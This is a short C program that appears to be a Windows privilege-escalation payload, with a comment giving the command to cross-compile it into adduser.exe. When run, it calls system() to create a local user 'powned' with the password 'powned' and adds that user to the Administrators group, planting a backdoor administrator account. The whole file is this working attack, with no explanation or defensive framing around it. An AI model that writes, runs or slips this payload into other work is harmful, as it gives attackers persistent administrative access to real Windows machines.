#include <stdio.h>
#include <string.h>

int main ()
{

   system("net user powned powned /add");
   system("net localgroup Administrators powned /add");

   return(0);
} 
/* Compile It:  x86_64-w64-mingw32-gcc adduser.c -o adduser.exe   */ 